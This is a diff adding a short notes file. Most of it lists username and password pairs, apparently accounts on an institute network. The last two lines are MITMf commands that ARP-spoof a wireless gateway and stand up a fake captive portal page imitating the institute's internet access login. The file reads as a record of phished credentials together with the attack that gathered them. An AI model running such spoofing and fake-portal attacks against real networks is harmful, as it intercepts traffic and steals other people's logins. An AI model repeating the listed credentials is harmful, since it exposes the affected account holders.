@@ -1,0 +1,22 @@
+manorama18101 manorama0202
+
+amans18100    aman1307
+
+avinash18100 avinash0801
+
+sumit18101 sumit2109
+
+neeraj18101 neeraj2110
+
+//vatsala18101 lengthofsubtangentydx/dymathsis$
+
+rahuln18100 rahul1503
+
+abhishek18101 7893006007Di
+amit1505  amit18101
+
+
+
+/root/.virtualenvs/MITMf/bin/python2.7 mitmf.py -i wlan0 --spoof --arp --gateway 172.16.121.1
+
+/root/.virtualenvs/MITMf/bin/python2.7 mitmf.py -i wlan0 --spoof --arp --gateway 172.16.122.1 --captive --portalurl http://172.16.122.45/IIIT-NR_Internet_Access.html
